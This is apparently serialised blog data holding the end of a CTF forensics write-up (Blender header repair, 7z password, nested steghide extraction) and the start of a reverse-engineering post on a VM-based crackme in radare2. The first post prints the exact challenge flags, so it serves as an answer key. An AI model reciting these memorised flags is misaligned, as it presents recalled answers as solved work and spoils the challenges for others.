Base64-encode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">encrypted_data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> binascii.unhexlify(encrypted_data_hex)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">key \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> binascii.unhexlify(key_hex)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">decrypted_data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> bytes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">([d \u003C/span>\u003Cspan style=\"color:#F97583\">^\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> k \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> d, k \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> zip\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(encrypted_data, key)])\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">flag \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> base64.b64encode(decrypted_data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Flag: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">flag.decode(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'utf-8'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"flag-3ds94yox\">Flag: 3ds94yOX\u003C/h3>\n\u003Ch1 id=\"part-3\">PART-3\u003C/h1>\n\u003Ch2 id=\"step-1-inspect-the-hint-file\">Step 1: Inspect the Hint File\u003C/h2>\n\u003Cp>The first file to examine is \u003Ccode>hi.pskx\u003C/code>. Using basic tools like \u003Ccode>strings\u003C/code> or \u003Ccode>grep\u003C/code>, unusual sequences can be found. Searching for Base64-like strings reveals a hidden message:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -a\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -oE\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> '[A-Za-z0-9+/=]{12,}'\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> hi.pskx\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> head\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -n1\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> base64\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Decoded, this produces:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Bones align not for anatomy\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This isn’t the final answer. Instead, it guides you to \u003Cstrong>look at bones or root nodes\u003C/strong> in the Blender file to ultimately derive the archive password.\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"step-2-repair-the-blender-file-header-first-8-bytes\">Step 2: Repair the Blender File Header (First 8 Bytes)\u003C/h2>\n\u003Cp>The corrupted Blender or \u003Ccode>.pskx\u003C/code> file cannot open because the \u003Cstrong>first 8 bytes\u003C/strong> are broken, which contain the \u003Cstrong>magic number and version\u003C/strong>. Players must repair this to continue.\u003C/p>\n\u003Cp>\u003Cstrong>Solution:\u003C/strong>\u003C/p>\n\u003Col>\n\u003Cli>Backup the broken file:\u003C/li>\n\u003C/ol>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">cp\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> broken.blend\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> broken.blend.bak\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Col start=\"2\">\n\u003Cli>\n\u003Cp>Obtain a reference file (\u003Ccode>ref.blend\u003C/code>) from the same Blender version or exporter.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Replace only the first 8 bytes using a hex editor or command-line tool:\u003C/p>\n\u003C/li>\n\u003C/ol>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Replace the first 8 bytes\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">dd\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> if=ref.blend\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> of=broken.blend\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> bs=\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> count=\u003C/span>\u003Cspan style=\"color:#79B8FF\">8\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> conv=notrunc\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>\u003Ccode>bs=1 count=8\u003C/code> → only the first 8 bytes are replaced\u003C/li>\n\u003Cli>\u003Ccode>conv=notrunc\u003C/code> → keeps the rest of the file intact\u003C/li>\n\u003C/ul>\n\u003Col start=\"4\">\n\u003Cli>Verify the file opens in Blender. The rest of the file remains untouched, allowing you to continue.\u003C/li>\n\u003C/ol>\n\u003Cblockquote>\n\u003Cp>Fixing the first 8 bytes restores the file’s magic number and version, enabling inspection of root nodes to derive the next clue.\u003C/p>\n\u003C/blockquote>\n\u003Chr>\n\u003Ch2 id=\"step-3-extract-root-node-values\">Step 3: Extract Root Node Values\u003C/h2>\n\u003Cp>Once the Blender file opens, examine \u003Cstrong>root nodes or bones\u003C/strong>, which contain numeric values forming the zip password. This can be done inside Blender or with a headless Python snippet:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">blender\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --background\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> repaired.blend\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --python-expr\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">import bpy, json\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">objs={}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">for o in bpy.data.objects:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  props={}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  try:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    for k in o.keys():\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">      if k!='_RNA_UI': props[k]=o[k]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  except Exception:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    pass\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  if props: objs[o.name]=props\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">print(json.dumps(objs))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Inspect the output for root node values. These numbers are combined to form the \u003Cstrong>zip password\u003C/strong>, e.g., \u003Ccode>498\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-16.png\" alt=\"Blender root node values\">\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"step-4-unlock-the-encrypted-archive\">Step 4: Unlock the Encrypted Archive\u003C/h2>\n\u003Cp>Use the password obtained from the root nodes to extract the hidden stego image from the archive:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">7z\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> x\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> challenge.7z\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -p498\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Everything is Ok\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Size:       5855446\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Compressed: 5693434\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We now have \u003Ccode>lunee.jpg\u003C/code>.\u003C/p>\n\u003Ch3 id=\"step-2-analyze-luneejpg\">Step 2: Analyze lunee.jpg\u003C/h3>\n\u003Cp>Let’s check if there’s anything hidden in this image using steghide:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> info\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> lunee.jpg\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>\"lunee.jpg\":\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  format: jpeg\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  capacity: 346.5 KB\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Try to get information about embedded data ? (y/n) y\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Enter passphrase:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  embedded file \"s3cret.jpg\":\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    size: 64.5 KB\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    encrypted: rijndael-128, cbc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    compressed: yes\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Perfect! There’s another file hidden inside. Let’s extract it:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> extract\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -sf\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> lunee.jpg\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Press Enter when prompted for the passphrase (no password needed).\u003C/p>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>wrote extracted data to \"s3cret.jpg\".\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"step-3-extract-from-s3cretjpg\">Step 3: Extract from s3cret.jpg\u003C/h3>\n\u003Cp>Now we have another image. Let’s check if this one also contains hidden data:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> info\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> s3cret.jpg\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>It does! Let’s extract it:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> extract\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -sf\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> s3cret.jpg\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Again, press Enter for no password.\u003C/p>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>wrote extracted data to \"flag.txt\".\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"step-4-get-the-flag\">Step 4: Get the Flag\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">cat\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> flag.txt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Flag:\u003C/strong> \u003Ccode>Cl41r3_3xp3d33  4sh3n_B0n3s33\u003C/code>\u003C/p>\n\u003Ch2 id=\"solution-summary\">Solution Summary\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Full solution one-liner\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">7z\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> x\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> challenge.7z\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -p498\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> &#x26;&#x26; \u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> extract\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -sf\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> lunee.jpg\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -p\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> &#x26;&#x26; \u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">steghide\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> extract\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -sf\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> s3cret.jpg\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -p\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> &#x26;&#x26; \u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">cat\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> flag.txt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>part 1\r\n\u003Ccode>c275036.89749.549105.207\u003C/code>\u003C/p>\n\u003Cp>part2\r\n\u003Ccode>3ds94yOX\u003C/code>\u003C/p>\n\u003Cp>part3\r\n\u003Ccode>Cl41r3_3xp3d33  4sh3n_B0n3s33\u003C/code>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>The flag format is :\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>ctf{PART1_PART2_PART3}kernel\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"flag---ctfc27503689749549105207_3ds94yox_cl41r3_3xp3d334sh3n_b0n3s33kernel\">\u003Cstrong>FLAG - ctf{c275036.89749.549105.207_3ds94yOX_Cl41r3_3xp3d334sh3n_B0n3s33}kernel\u003C/strong>\u003C/h2>",{"headings":638,"localImagePaths":738,"remoteImagePaths":739,"frontmatter":740,"imagePaths":742},[639,640,643,646,649,652,653,656,657,660,663,666,669,672,675,678,681,684,687,690,693,696,699,702,705,708,711,714,717,720,723,726,729,732,735],{"depth":27,"slug":115,"text":116},{"depth":27,"slug":641,"text":642},"ashen-shard","Ashen Shard",{"depth":27,"slug":644,"text":645},"cinder-of-the-rogue-machine","Cinder of the Rogue Machine",{"depth":27,"slug":647,"text":648},"bone-of-the-lost-reflection","Bone of the Lost Reflection",{"depth":27,"slug":650,"text":651},"objective","Objective",{"depth":24,"slug":355,"text":356},{"depth":24,"slug":654,"text":655},"part-1","PART-1",{"depth":27,"slug":118,"text":119},{"depth":27,"slug":658,"text":659},"modding-considerations","Modding Considerations",{"depth":40,"slug":661,"text":662},"dll-mods","DLL Mods",{"depth":40,"slug":664,"text":665},"file-replacement-mods","File Replacement Mods",{"depth":27,"slug":667,"text":668},"approach","Approach",{"depth":27,"slug":670,"text":671},"understanding-file-structure-for-file-replacement-mods","Understanding file structure for file replacement mods",{"depth":27,"slug":673,"text":674},"now-onto-the-main-ds-map-studio","Now onto the main DS-MAP Studio",{"depth":27,"slug":676,"text":677},"patched-version","Patched Version:",{"depth":27,"slug":679,"text":680},"remove-all-checks-for-ds1","Remove All Checks for DS1",{"depth":40,"slug":682,"text":683},"supported-xml-classes","Supported XML classes",{"depth":40,"slug":685,"text":686},"python-wrapper-classes","Python wrapper classes",{"depth":40,"slug":688,"text":689},"binary-export-classes-v5---v2014","Binary export classes (v5 - v2014)",{"depth":40,"slug":691,"text":692},"the-values-for-the-model-id-and-the-location-are-the-flag-bits","THE VALUES FOR THE MODEL ID AND THE LOCATION ARE THE FLAG BITS",{"depth":24,"slug":694,"text":695},"part-2","PART-2",{"depth":27,"slug":697,"text":698},"identifying--binary-characteristics","Identifying  Binary Characteristics",{"depth":40,"slug":700,"text":701},"file-analysis","File Analysis",{"depth":40,"slug":703,"text":704},"strings-analysis","Strings Analysis",{"depth":40,"slug":706,"text":707},"flag-3ds94yox","Flag: 3ds94yOX",{"depth":24,"slug":709,"text":710},"part-3","PART-3",{"depth":27,"slug":712,"text":713},"step-1-inspect-the-hint-file","Step 1: Inspect the Hint File",{"depth":27,"slug":715,"text":716},"step-2-repair-the-blender-file-header-first-8-bytes","Step 2: Repair the Blender File Header (First 8 Bytes)",{"depth":27,"slug":718,"text":719},"step-3-extract-root-node-values","Step 3: Extract Root Node Values",{"depth":27,"slug":721,"text":722},"step-4-unlock-the-encrypted-archive","Step 4: Unlock the Encrypted Archive",{"depth":40,"slug":724,"text":725},"step-2-analyze-luneejpg","Step 2: Analyze lunee.jpg",{"depth":40,"slug":727,"text":728},"step-3-extract-from-s3cretjpg","Step 3: Extract from s3cret.jpg",{"depth":40,"slug":730,"text":731},"step-4-get-the-flag","Step 4: Get the Flag",{"depth":27,"slug":733,"text":734},"solution-summary","Solution Summary",{"depth":27,"slug":736,"text":737},"flag---ctfc27503689749549105207_3ds94yox_cl41r3_3xp3d334sh3n_b0n3s33kernel","FLAG - ctf${c275036.89749.549105.207_3ds94yOX_Cl41r3_3xp3d334sh3n_B0n3s33}kernel",[],[],{"title":629,"date":741,"excerpt":631},"2024-12-29",[],"vmware",{"id":743,"data":745,"body":748,"filePath":749,"digest":750,"rendered":751},{"title":746,"date":747},"Slay the JIT: From Hotpatches to Symbolic Couture in Miasm",["Date","2025-12-12T00:00:00.000Z"],"Running `file` on the binary shows a standard ELF executable:\r\n\r\n![file info](/images/posts/vmware/image-1.png)\r\n\r\nNothing unusual here \r\n\r\n\r\n\r\n\r\nWhen executed, the binary asks for user input. Supplying anything incorrect leads to an immediate failure response, with no visible comparison or transformation in plaintext:\r\n\r\n![runtime input](/images/posts/vmware/image-2.png)\r\n\r\n\r\n\r\nOpening the binary in Binary Ninja reveals that the validation logic is **not normal control flow**. Instead, it looks like a **nested VM / emulator**, where execution is handled through multiple small functions acting like opcode handlers:\r\n\r\n![vm view](/images/posts/vmware/image-3.png)\r\n\r\nRather than direct comparisons, input seems to be processed through this interpreter.\r\n\r\n\r\n\r\nBelow the opcode-handling logic are several **hardcoded byte arrays** that resemble Base64-encoded data:\r\n\r\n![b64 array 1](/images/posts/vmware/image-4.png)\r\n\r\n![b64 array 2](/images/posts/vmware/image-5.png)\r\n\r\nThese are likely VM data or encrypted constants consumed by the interpreter rather than decoded directly in native code.\r\n\r\n\r\n\r\nThe registers are 25 in count so we need to figure out the opcode for the instructions that the emulator will process.\r\n\r\n\r\nIll use radare 2 for finding what each of the instrucions mean ; \r\n\r\n\r\n![image](/images/posts/vmware/image-6.png)\r\n\r\n\r\nBefore the virtual machine executes any bytecode, it initializes an opcode dispatch table. This is done through a helper function (fcn.00001238), which is repeatedly called during VM setup.\r\n\r\n![image](/images/posts/vmware/image-7.png)\r\n\r\nIn my best attempts this would be like \r\n```c\r\nentry = calloc(1, sizeof(opcode_entry));\r\nentry->opcode = opcode;\r\nentry->handler = handler;\r\n\r\nbucket = opcode_table[hash(opcode)];\r\nentry->next = bucket;\r\nopcode_table[hash(opcode)] = entry;\r\n\r\n```\r\nIt seems like it is indeed the dispatcher for the architecture \r\n\r\n![image](/images/posts/vmware/image-8.png)\r\n\r\n\r\nAfter allocating the opcode table, the program registers every VM instruction by pairing:\r\n\r\nan encoded opcode value (32-bit constant in edi) ,a handler function (function pointer in rsi)\r\n\r\nSo i'll move onto the next function here which is \r\n\r\n```bash\r\n[0x00001d44]> s 0x000014cd\r\n[0x000014cd]> pdf\r\nERROR: Cannot find function at 0x000014cd\r\n[0x000014cd]> af\r\n[0x000014cd]> pdf\r\n            ; DATA XREF from main @ 0x1dde(r)\r\n┌ 195: fcn.000014cd (int64_t arg1);\r\n│ `- args(rdi) vars(3:sp[0xc..0x20])\r\n│           0x000014cd      55             push rbp\r\n│           0x000014ce      4889e5         mov rbp, rsp\r\n│           0x000014d1      48897de8       mov qword [var_18h], rdi    ; arg1\r\n│           0x000014d5      488b45e8       mov rax, qword [var_18h]\r\n│           0x000014d9      488b10         mov rdx, qword [rax]\r\n│           0x000014dc      488b45e8       mov rax, qword [var_18h]\r\n│           0x000014e0      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x000014e3      4898           cdqe\r\n│           0x000014e5      48c1e002       shl rax, 2\r\n│           0x000014e9      4801d0         add rax, rdx\r\n│           0x000014ec      8b00           mov eax, dword [rax]\r\n│           0x000014ee      8945fc         mov dword [var_4h], eax\r\n│           0x000014f1      488b45e8       mov rax, qword [var_18h]\r\n│           0x000014f5      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x000014f8      8d50ff         lea edx, [rax - 1]\r\n│           0x000014fb      488b45e8       mov rax, qword [var_18h]\r\n│           0x000014ff      895038         mov dword [rax + 0x38], edx\r\n│           0x00001502      488b45e8       mov rax, qword [var_18h]\r\n│           0x00001506      488b10         mov rdx, qword [rax]\r\n│           0x00001509      488b45e8       mov rax, qword [var_18h]\r\n│           0x0000150d      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x00001510      4898           cdqe\r\n│           0x00001512      48c1e002       shl rax, 2\r\n│           0x00001516      4801d0         add rax, rdx\r\n│           0x00001519      8b00           mov eax, dword [rax]\r\n│           0x0000151b      8945f8         mov dword [var_8h], eax\r\n│           0x0000151e      488b45e8       mov rax, qword [var_18h]\r\n│           0x00001522      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x00001525      8d50ff         lea edx, [rax - 1]\r\n│           0x00001528      488b45e8       mov rax, qword [var_18h]\r\n│           0x0000152c      895038         mov dword [rax + 0x38], edx\r\n│           0x0000152f      488b45e8       mov rax, qword [var_18h]\r\n│           0x00001533      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x00001536      8d5001         lea edx, [rax + 1]\r\n│           0x00001539      488b45e8       mov rax, qword [var_18h]\r\n│           0x0000153d      895038         mov dword [rax + 0x38], edx\r\n│           0x00001540      8b55fc         mov edx, dword [var_4h]\r\n│           0x00001543      8b45f8         mov eax, dword [var_8h]\r\n│           0x00001546      8d0c02         lea ecx, [rdx + rax]\r\n│           0x00001549      488b45e8       mov rax, qword [var_18h]\r\n│           0x0000154d      488b10         mov rdx, qword [rax]\r\n│           0x00001550      488b45e8       mov rax, qword [var_18h]\r\n│           0x00001554      8b4038         mov eax, dword [rax + 0x38]\r\n│           0x00001557      4898           cdqe\r\n│           0x00001559      48c1e002       shl rax, 2\r\n│           0x0000155d      488d3402       lea rsi, [rdx + rax]\r\n│           0x00001561      4863d1         movsxd rdx, ecx\r\n│           0x00001564      4889d0         mov rax, rdx\r\n│           0x00001567      48c1e01e       shl rax, 0x1e\r\n│           0x0000156b      4801d0         add rax, rdx\r\n│           0x0000156e      48c1e820       shr rax, 0x20\r\n│           0x00001572      89c2           mov edx, eax\r\n│           0x00001574      c1fa1d         sar edx, 0x1d\r\n│           0x00001577      89c8           mov eax, ecx\r\n│           0x00001579      c1f81f         sar eax, 0x1f\r\n│           0x0000157c      29c2           sub edx, eax\r\n│           0x0000157e      89d0           mov eax, edx\r\n│           0x00001580      89c2           mov edx, eax\r\n│           0x00001582      c1e21f         shl edx, 0x1f\r\n│           0x00001585      29c2           sub edx, eax\r\n│           0x00001587      89c8           mov eax, ecx\r\n│           0x00001589      29d0           sub eax, edx\r\n│           0x0000158b      8906           mov dword [rsi], eax\r\n│           0x0000158d      90             nop\r\n│           0x0000158e      5d             pop rbp\r\n└           0x0000158f      c3             ret\r\n```\r\nThis opcode handler implements the VM’s ADD instruction. It operates on the VM stack by popping two 32-bit values, decrementing the stack pointer accordingly. The two values are added together, and the resulting sum is reduced using a modulo operation with 0x7fffffff to constrain it within a fixed range. \r\n\r\nAfter identifying the VM structure, the next step is manually identifying each opcode handler (would not reccomend) \r\n\r\n\r\nWe backtrack to the first opcode registration point:\r\n\r\n```asm\r\ns 0x00001dde\r\n```\r\n\r\n MUL Opcode\r\n\r\nThis instruction pops two values from the VM stack, multiplies them, applies modulo `0x7fffffff`, and pushes the result back onto the stack.\r\n\r\n![MUL](/images/posts/vmware/image-9.png)\r\n\r\n---\r\n\r\n XOR Opcode\r\n\r\n```\r\nOpcode: 0x48c5ccc6  \r\nHandler: 0x00001438\r\n```\r\n\r\nThe XOR instruction pops two values from the stack, performs a bitwise XOR, and pushes the 